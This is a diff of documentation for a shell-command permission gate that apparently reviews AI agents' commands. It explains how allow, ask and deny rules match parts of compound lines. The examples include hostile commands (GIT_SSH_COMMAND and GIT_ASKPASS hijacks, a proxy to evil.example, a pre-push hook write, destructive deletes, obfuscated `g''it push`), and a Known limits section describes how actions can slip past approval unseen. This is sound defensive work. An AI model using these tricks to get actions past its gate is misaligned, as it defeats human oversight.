@@ -601,68 +601,73 @@ gate does not read:
   delete is the more severe part and would otherwise set the card. A category line or rule that
   denies a part denies the line too (#191): each part below the dominant one is decided by its
   category's line and then the first rule that matches it (or a deny rule whose `command` regex
-  matches a decoded view of the line), and a `deny` there denies the line, with a reason that names
-  the part (`denied by policy (category local_write: write /tmp/f)`). There an allow or log rule's
-  `command` regex must match the part's own text, while an ask or deny rule's matches the whole
-  line (next item), so an allow rule written for another command on the line does not lift the
-  part's deny. Only a deny reaches the parts: allow, log and ask lines and rules, the opaque bump,
+  matches a decoded view of the line), and a `deny` there denies the line, with a reason that
+  names the part (`denied by policy (category local_write: write /tmp/f)`). There any rule but a
+  deny can only lower the part's line, so an allow, log or ask rule's `command` regex must match
+  the part's own text (#394, next item), while a deny rule's matches the whole line. A rule
+  written for another command on the line does not lift the part's deny: under
+  `categories: {github_post: deny}`, an allow rule for `'^git push --force origin main$'` and an
+  ask rule for `git push` after it, `gh pr comment 3 --body x && git push --force origin main` is
+  denied. Only a deny reaches the parts: allow, log and ask lines and rules, the opaque bump,
   third-party escalation, posting checks and the floors see the dominant part (a `reserved:` entry
-  gives an ask on any part). A part carries the tool of the call it came in on (`tool:execute_code`
-  matches the `execute_code` tool, not `python -c` run from bash) and the views of its line, so the
-  `command` regex of a `reserved` or `deny` entry or a deny rule matches a part as it matches the
-  line (`g''it push origin main && rm -rf build` is denied under
+  gives an ask on any part). A part carries the tool of the call it came in on
+  (`tool:execute_code` matches the `execute_code` tool, not `python -c` run from bash) and the
+  views of its line, so the `command` regex of a `reserved` or `deny` entry or a deny rule matches
+  a part as it matches the line (`g''it push origin main && rm -rf build` is denied under
   `{category: vcs_push, command: 'git push'}`), the `ssh` hop is a part whose target is the bare
   host (`user@`, `ssh://` and a `:port` stripped) and the destination as written, and the inner
-  commands of an `ssh` line are `internal`. A mapping entry in `reserved` or `deny` counts only its
-  match keys: any other key (`reason`, `name`, a note, a typo) is dropped, so it widens the entry
-  instead of voiding it, and an entry left with no match key matches every action. The ledger view
-  of a classification (`as_dict`) leaves the parts out. `Decision.reserved` names the parts a
-  reserved entry matched, once each, and the exo-gate hook does not let a standing grant for the
-  line's category cover one of them. Its ledger view (`Decision.as_dict`) redacts URL userinfo
-  (`https://***@host/...`).
-- How a rule's `command` regex matches a compound line (#394). Each part also carries its own text:
-  its simple command as written, with its redirections, after leading reserved words such as `then`
-  (`git push --force origin main` in `if x; then git push --force origin main; fi`). A prefix such
-  as `sudo`, `env` or `timeout` stays in it (`sudo git push --force origin main`). A nested command
-  has its text in the nested line: `git push --force origin main` in
+  commands of an `ssh` line are `internal`. A mapping entry in `reserved` or `deny` counts only
+  its match keys: any other key (`reason`, `name`, a note, a typo) is dropped, so it widens the
+  entry instead of voiding it, and an entry left with no match key matches every action. The
+  ledger view of a classification (`as_dict`) leaves the parts out. `Decision.reserved` names the
+  parts a reserved entry matched, once each, and the exo-gate hook does not let a standing grant
+  for the line's category cover one of them. Its ledger view (`Decision.as_dict`) redacts URL
+  userinfo (`https://***@host/...`).
+- How a rule's `command` regex matches a compound line (#394). Each part also carries its own
+  text: its simple command as written, with its redirections, after leading reserved words such as
+  `then` (`git push --force origin main` in `if x; then git push --force origin main; fi`). A
+  prefix such as `sudo`, `env` or `timeout` stays in it (`sudo git push --force origin main`). A
+  nested command has its text in the nested line: `git push --force origin main` in
   `echo $(git push --force origin main)`, in a `bash -c` or `eval` string, in a heredoc a shell
   reads and in `ssh host 'git push --force origin main'`. A part the gate makes up, a nest past a
   depth or nesting cap and a string literal in code (only a guess at a command) have no own text.
   Ask and deny rules, and the `command:` entries of `reserved:` and `deny:`, match the whole line
-  and its decoded views, so they can only catch more. So does a log rule over an allow cell, which
-  only raises the line, unless it names `opaque_exec` (it then lowers the opaque floor). Any other
-  allow or log rule's `command` regex decides a compound line only when it matches the own text of
-  every part that carries the line's category or is as severe as the combined result, and of every
-  other part that alone would get a stricter outcome than the rule gives (a rider). Alone means
-  the part without the parts it was built from, on its own text, decided once with no rules and
-  once with all of them, the stricter kept: its category line and the matrix count, and so does a
-  rule that raises it, while another allow rule does not lower it. The regex must also match every
-  command that changes the shell for the commands after it on the line, since a bash call starts a
-  fresh shell and only a later command on the same line sees the change: an assignment with no
-  command, `export` and the other declaring builtins with an operand, `set -a`, `set -k` and
-  `set -- args`, `shopt -s`, `printf -v`, `read`, `mapfile`, `getopts`, `let`, `hash`, `alias`,
-  `enable`, `unset` and `trap` with an operand, `source` and `.`, `pushd`, `popd`, `exec` with only
-  redirections, a `for` or `select` loop, `coproc`, a function definition (which has no own text)
-  and a program name the gate cannot read. `cd` is not on that list (Known limits), and the text of
-  an `eval` is a nested line whose own commands count. A part with no own text matches no such rule.
-  When it does not match, the rule is skipped and the next one is tried. So
-  `{command: '^git status', decision: allow}` no longer allows
+  and its decoded views, so they can only catch more (in the #191 pass above an ask rule only
+  lowers a part's deny, so there it matches the part's own text). So does a log rule over an allow
+  cell, which only raises the line, unless it names `opaque_exec` (it then lowers the opaque
+  floor). Any other allow or log rule's `command` regex decides a compound line only when it
+  matches the own text of every part that carries the line's category or is as severe as the
+  combined result, and of every other part that alone would get a stricter outcome than the rule
+  gives (a rider). Alone means the part without the parts it was built from, on its own text,
+  decided once with no rules and once with all of them, the stricter kept: its category line and
+  the matrix count, and so does a rule that raises it, while another allow rule does not lower it.
+  The regex must also match every command that changes the shell for the commands after it on the
+  line, since a bash call starts a fresh shell and only a later command on the same line sees the
+  change: an assignment with no command, `export` and the other declaring builtins with an
+  operand, `set -a`, `set -k` and `set -- args`, `shopt -s`, `printf -v`, `read`, `mapfile`,
+  `getopts`, `let`, `hash`, `alias`, `enable`, `unset` and `trap` with an operand, `source` and
+  `.`, `pushd`, `popd`, `exec` with only redirections, a `for` or `select` loop, `coproc`, a
+  function definition (which has no own text) and a program name the gate cannot read. `cd` is not
+  on that list (Known limits), and the text of an `eval` is a nested line whose own commands
+  count. A part with no own text matches no such rule. When it does not match, the rule is skipped
+  and the next one is tried. So `{command: '^git status', decision: allow}` no longer allows
   `git status; git push --force origin main`: it asks, and under `categories: {force_push: deny}`
   it is denied. `{command: 'git push --force origin main', decision: allow}` still allows
   `cd repo && git push --force origin main`, and a rule has to name both pushes to allow
   `git push --force origin main; git push --force origin dev`. Under
-  `{command: '^git push --force origin main$', decision: allow}` the push asks beside a command that
-  would ask alone: a delete (`rm -rf build`, `kubectl delete ns prod`, `terraform destroy`), a post
-  to a third party (`gh pr comment 3 --body hi`), `vercel deploy --prod`, `git reset --hard`, an
-  unknown program, an `ssh -o ProxyCommand` or a function body that shadows `git`. It asks too when
-  a copy of the push that never runs stands in for it (`if false; then ...; fi; rm -rf build`).
-  With an ask rule for `curl` after that allow rule, it asks beside `curl -s https://example.com/x`
-  too. It asks after `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"`, `export GIT_ASKPASS=/tmp/evil`,
-  `hash -p /tmp/evil git` or `export https_proxy=http://evil.example:8080`, each allowed alone, and
-  is allowed after `cd repo`, `set -e` or `git status`. Equally severe commands are matched
+  `{command: '^git push --force origin main$', decision: allow}` the push asks beside a command
+  that would ask alone: a delete (`rm -rf build`, `kubectl delete ns prod`, `terraform destroy`),
+  a post to a third party (`gh pr comment 3 --body hi`), `vercel deploy --prod`,
+  `git reset --hard`, an unknown program, an `ssh -o ProxyCommand` or a function body that shadows
+  `git`. It asks too when a copy of the push that never runs stands in for it
+  (`if false; then ...; fi; rm -rf build`). With an ask rule for `curl` after that allow rule, it
+  asks beside `curl -s https://example.com/x` too. It asks after
+  `export GIT_SSH_COMMAND="$(cat /tmp/cmd)"`, `export GIT_ASKPASS=/tmp/evil`,
+  `hash -p /tmp/evil git` or `export https_proxy=http://evil.example:8080`, each allowed alone,
+  and is allowed after `cd repo`, `set -e` or `git status`. Equally severe commands are matched
   together, so their order does not change the outcome. The opaque_exec reading of a line with a
-  `$".."` word is the gate's, so it has no own text. The regex sees the text as written: an
-  allow rule for `git push` does not match `g''it push --force origin main`, and a deny rule for
+  `$".."` word is the gate's, so it has no own text. The regex sees the text as written: an allow
+  rule for `git push` does not match `g''it push --force origin main`, and a deny rule for
   `git push` still denies it. A line of one part (one simple command, or a tool that is not a
   shell) is matched on its command text as before. A rule that matched a whole compound line, such
   as `'^make && make install$'`, now has to match each deciding command (`'^make( install)?$'`),
@@ -1004,26 +1009,27 @@ Known limits. Each one is true of main today; where a fix is open, its PR is nam
   that host still denies it (#153, fixed by
   #164). Past the cap the line asks unless the principal has set a policy for `opaque_exec` (a
   `command:` deny entry or a deny rule that matches the text still denies it).
-- **Only a deny reaches every part of a line.** `classify_shell` keeps the most severe part of
-  a compound line, which sets the card. A deny reaches every part the gate reads, nested ones
-  included: a `deny:` entry since D-075, and a `categories:` line or rule that denies a part
-  since #191. So `gh pr comment 3 --body hi && rm -rf build` is denied under
+- **Only a deny reaches every part of a line.** `classify_shell` keeps the most severe part of a
+  compound line, which sets the card. A deny reaches every part the gate reads, nested ones
+  included: a `deny:` entry since D-075, and a `categories:` line or rule that denies a part since
+  #191. So `gh pr comment 3 --body hi && rm -rf build` is denied under
   `categories: {github_post: deny}` as under `deny: [github_post]`, and
   `coproc w { curl https://example.com; }` (and `function f { curl https://example.com; }`) is
-  denied under `categories: {web_read: deny}`, though the block is `opaque_exec`. An allow, log
-  or ask line or rule applies to the line's own category only: under
-  `categories: {github_post: ask}` the line above asks for the delete, and approving it sends
-  the post too. Since #394 an allow or log rule's `command` regex has to name the deciding command
-  and every command that would get a stricter outcome alone, but a command allowed alone still
-  rides on the outcome it gives: `cd /tmp/other && git push --force origin main` and
-  `echo x > .git/hooks/pre-push && git push --force origin main` are allowed under an allow rule for
-  `'^git push --force origin main$'`, and the push then runs the hooks there. A file outlives the
-  call, so on main two calls (the write, then the push) do the same. `cd` changes the shell for the
-  commands after it but is left off the setter list, so that a rule for a command still covers
-  `cd repo && command`. Use `reserved:` to ask on any part. Under either deny form the four-wrapper example above is denied and the five-wrapper
-  example asks as `opaque_exec`. So approving an opaque card or a compound line can run an action
-  the gate did not show. Read the whole command before approving it: an approval does not vouch for
-  what the gate did not classify.
+  denied under `categories: {web_read: deny}`, though the block is `opaque_exec`. An allow, log or
+  ask line or rule applies to the line's own category only: under `categories: {github_post: ask}`
+  the line above asks for the delete, and approving it sends the post too. Since #394 an allow or
+  log rule's `command` regex has to name the deciding command and every command that would get a
+  stricter outcome alone, but a command allowed alone still rides on the outcome it gives:
+  `cd /tmp/other && git push --force origin main` and
+  `echo x > .git/hooks/pre-push && git push --force origin main` are allowed under an allow rule
+  for `'^git push --force origin main$'`, and the push then runs the hooks there. A file outlives
+  the call, so on main two calls (the write, then the push) do the same. `cd` changes the shell
+  for the commands after it but is left off the setter list, so that a rule for a command still
+  covers `cd repo && command`. Use `reserved:` to ask on any part. Under either deny form the
+  four-wrapper example above is denied and the five-wrapper example asks as `opaque_exec`. So
+  approving an opaque card or a compound line can run an action the gate did not show. Read the
+  whole command before approving it: an approval does not vouch for what the gate did not
+  classify.
 - **Deny becomes ask.** Where the gate cannot read the command it files the line as
   `opaque_exec`, which asks, so a `deny:` or `categories:` entry for the hidden action becomes
   an ask, and the card names the wrapper rather than the action. For example: nesting past the
